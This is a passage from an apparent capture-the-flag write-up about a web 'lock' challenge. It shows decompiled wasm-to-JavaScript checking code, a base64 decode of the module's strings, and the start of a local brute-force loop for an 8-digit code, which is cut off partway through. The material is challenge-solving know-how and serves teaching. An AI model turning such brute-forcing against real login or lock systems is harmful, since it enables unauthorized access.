  <span class="kd">var</span> <span class="nx">$3_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">$3_1</span> <span class="o">=</span> <span class="nb">global</span><span class="nx">$0</span> <span class="o">-</span> <span class="mi">16</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nb">global</span><span class="nx">$0</span> <span class="o">=</span> <span class="nx">$3_1</span><span class="p">;</span>
  <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">$0</span><span class="p">;</span>
  <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>
  <span class="nx">label$1</span> <span class="p">:</span> <span class="p">{</span>
   <span class="nx">label$2</span> <span class="p">:</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">break</span> <span class="nx">label$2</span>
    <span class="p">}</span>
    <span class="nf">$2</span><span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">break</span> <span class="nx">label$1</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
   <span class="nx">label$3</span> <span class="p">:</span> <span class="p">{</span>
    <span class="nx">label$4</span> <span class="p">:</span> <span class="p">{</span>
     <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">break</span> <span class="nx">label$4</span>
     <span class="p">}</span>
     <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
     <span class="nx">label$5</span> <span class="p">:</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">3</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
       <span class="k">break</span> <span class="nx">label$5</span>
      <span class="p">}</span>
      <span class="nf">$2</span><span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span>
      <span class="k">break</span> <span class="nx">label$1</span><span class="p">;</span>
     <span class="p">}</span>
     <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
     <span class="nx">label$6</span> <span class="p">:</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
       <span class="k">break</span> <span class="nx">label$6</span>
      <span class="p">}</span>
      <span class="nx">label$7</span> <span class="p">:</span> <span class="p">{</span>
       <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">break</span> <span class="nx">label$7</span>
       <span class="p">}</span>
       <span class="nx">label$8</span> <span class="p">:</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
         <span class="k">break</span> <span class="nx">label$8</span>
        <span class="p">}</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
         <span class="k">break</span> <span class="nx">label$8</span>
        <span class="p">}</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">28</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
         <span class="k">break</span> <span class="nx">label$8</span>
        <span class="p">}</span>
        <span class="nf">$1</span><span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">break</span> <span class="nx">label$1</span><span class="p">;</span>
       <span class="p">}</span>
      <span class="p">}</span>
     <span class="p">}</span>
     <span class="k">break</span> <span class="nx">label$3</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nf">$2</span><span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">break</span> <span class="nx">label$1</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="nf">$2</span><span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="nb">global</span><span class="nx">$0</span> <span class="o">=</span> <span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$4</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">global</span><span class="nx">$0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$5</span><span class="p">(</span><span class="nx">$0</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">$0</span> <span class="o">=</span> <span class="nx">$0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nb">global</span><span class="nx">$0</span> <span class="o">=</span> <span class="nx">$0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$6</span><span class="p">(</span><span class="nx">$0</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">$0</span> <span class="o">=</span> <span class="nx">$0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">$1_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">$1_1</span> <span class="o">=</span> <span class="p">(</span><span class="nb">global</span><span class="nx">$0</span> <span class="o">-</span> <span class="nx">$0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">-</span><span class="mi">16</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nb">global</span><span class="nx">$0</span> <span class="o">=</span> <span class="nx">$1_1</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">$1_1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$7</span><span class="p">()</span> <span class="p">{</span>
  <span class="nb">global</span><span class="nx">$2</span> <span class="o">=</span> <span class="mi">5244240</span><span class="p">;</span>
  <span class="nb">global</span><span class="nx">$1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1356</span> <span class="o">+</span> <span class="mi">15</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">-</span><span class="mi">16</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$8</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">global</span><span class="nx">$0</span> <span class="o">-</span> <span class="nb">global</span><span class="nx">$1</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$9</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">global</span><span class="nx">$2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$10</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">global</span><span class="nx">$1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$11</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="mi">1352</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="nx">bufferView</span> <span class="o">=</span> <span class="nx">HEAPU8</span><span class="p">;</span>
 <span class="nf">initActiveSegments</span><span class="p">(</span><span class="nx">env</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">FUNCTION_TABLE</span> <span class="o">=</span> <span class="nc">Table</span><span class="p">([]);</span>
 <span class="kd">function</span> <span class="nf">__wasm_memory_size</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">buffer</span><span class="p">.</span><span class="nx">byteLength</span> <span class="o">/</span> <span class="mi">65536</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="k">return</span> <span class="p">{</span>
  <span class="dl">"</span><span class="s2">memory</span><span class="dl">"</span><span class="p">:</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="p">{</span>
   <span class="dl">"</span><span class="s2">grow</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>

   <span class="p">},</span>
   <span class="dl">"</span><span class="s2">buffer</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">:</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
     <span class="k">return</span> <span class="nx">buffer</span><span class="p">;</span>
    <span class="p">}</span>

   <span class="p">}</span>
  <span class="p">}),</span>
  <span class="dl">"</span><span class="s2">check</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$3</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">__indirect_function_table</span><span class="dl">"</span><span class="p">:</span> <span class="nx">FUNCTION_TABLE</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">__errno_location</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$11</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">emscripten_stack_init</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$7</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">emscripten_stack_get_free</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$8</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">emscripten_stack_get_base</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$9</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">emscripten_stack_get_end</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$10</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">stackSave</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$4</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">stackRestore</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$5</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">stackAlloc</span><span class="dl">"</span><span class="p">:</span> <span class="nx">$6</span>
 <span class="p">};</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">retasmFunc</span> <span class="o">=</span> <span class="nf">asmFunc</span><span class="p">(</span>  <span class="p">{</span> <span class="na">abort</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">abort</span><span class="dl">'</span><span class="p">);</span> <span class="p">}</span>
  <span class="p">});</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">memory</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">memory</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">check</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">check</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">__errno_location</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">__errno_location</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">emscripten_stack_init</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">emscripten_stack_init</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">emscripten_stack_get_free</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">emscripten_stack_get_free</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">emscripten_stack_get_base</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">emscripten_stack_get_base</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">emscripten_stack_get_end</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">emscripten_stack_get_end</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">stackSave</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">stackSave</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">stackRestore</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">stackRestore</span><span class="p">;</span>
<span class="k">export</span> <span class="kd">var</span> <span class="nx">stackAlloc</span> <span class="o">=</span> <span class="nx">retasmFunc</span><span class="p">.</span><span class="nx">stackAlloc</span><span class="p">;</span>
</pre></table></code></div></div><p>This bit looks promising:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span><span class="nv">WAAAAFQAAAAGAAAABQAAAAAAAAAKAAAATQAAAEEAAAADAAAAUwAAAAAAAAAAAAAABwAAAAoAAABbAAAADgAAAAEAAABIAAAAawAAAAQAAAAHAAAAZgAAAHAAAABjAAAAfgAAAEwAAAAAAAAAAAAAAFgAAABUAAAABgAAAAUAAAAAAAAACgAAAE0AAABBAAAAAwAAAFMAAAAAAAAAAAAAAAcAAAAKAAAAWwAAAA4AAAABAAAASAAAAGsAAAAEAAAABwAAAGYAAABwAAAAYwAAAH4AAABMAAAAAAAAAAAAAABZAAAAbwAAAHUAAAAgAAAAZAAAAGkAAABkAAAAIAAAAG4AAABvAAAAdAAAACAAAABvAAAAcAAAAGUAAABuAAAAIAAAAHQAAABoAAAAZQAAACAAAABsAAAAbwAAAGMAAABrAAAAIQAAAA</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span>
<span class="go">XT
MAS
[Hkfpc~LXT
MAS
[Hkfpc~LYou did not open the lock!%
</span></pre></table></code></div></div><p>but it’s not, yet.</p><p>Ok, let’s change gears, since we cannot reverse the wasm code. An 8 digit code is within bruteforcing range. But we don’t want to bruteforce the server, so can we do it locally?</p><p>We tried a bunch of ways to execute the wasm binary locally, but what ended up being easiest was using Chrome. In Developer tools you can use local overrides (<a href="https://www.debugbear.com/blog/devtools-local-overrides">instructions</a>), so we can adapt the <code class="language-plaintext highlighter-rouge">main.js</code> to bruteforce the code for us.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>
<span class="p">[..]</span>

<span class="kd">function</span> <span class="nf">bruteforce</span><span class="p">(){</span>
  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">10000000</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span> <span class="mi">999999999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>  <span class="c1">// let's hope the code doesnt start with 0 so we dont have to figure out leftpadding</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">i</span><span class="o">%</span><span class="mi">10000000</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">checking codes starting with </span><span class="dl">"</span><span class="o">+</span><span class="nx">i</span><span class="o">/</span><span class="mi">10000000</span><span class="p">);</span>
    <span class="p">}</span>
